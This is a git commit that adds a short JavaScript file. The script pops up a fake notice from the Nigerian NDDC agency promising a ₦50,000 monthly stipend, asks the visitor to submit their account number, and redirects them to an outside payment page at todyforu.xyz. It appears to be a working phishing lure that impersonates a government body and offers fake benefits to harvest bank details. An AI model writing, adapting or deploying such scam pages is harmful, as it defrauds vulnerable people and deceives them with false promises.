a6cede2fdaea26b4f1bed1af800f70030575d9e1
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-10-09 02:29:12 -0700

    Create activation-nddc-payment.js

---
+++ activation-nddc-payment.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw ₦50,000'
+password=prompt('NDDC: Payment ongoing. You are among the shortlisted candidates to Receive ₦50,000.00 monthly stipend, kindly press Ok to submit account number now ','Withdraw ₦50,000');
+if (password != 'Withdraw ₦50,000') {
+location.href='https://todyforu.xyz/nddc-payment.html';
+}
